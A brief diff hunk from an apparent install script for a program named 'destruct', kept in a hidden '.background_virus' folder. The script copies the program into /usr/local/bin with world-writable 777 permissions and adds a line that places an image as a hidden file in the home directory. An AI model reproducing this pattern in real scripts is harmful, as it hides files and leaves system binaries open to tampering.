@@ -12,4 +12,5 @@ rm mycron
 
 chmod 777 ~/Desktop/.background_virus/destruct
 cp ~/Desktop/.background_virus/destruct /usr/local/bin/destruct 
+cp ~/Desktop/.background_virus/mypillow.jpeg ~/.mypillow.jpeg
 chmod 777 /usr/local/bin/destruct
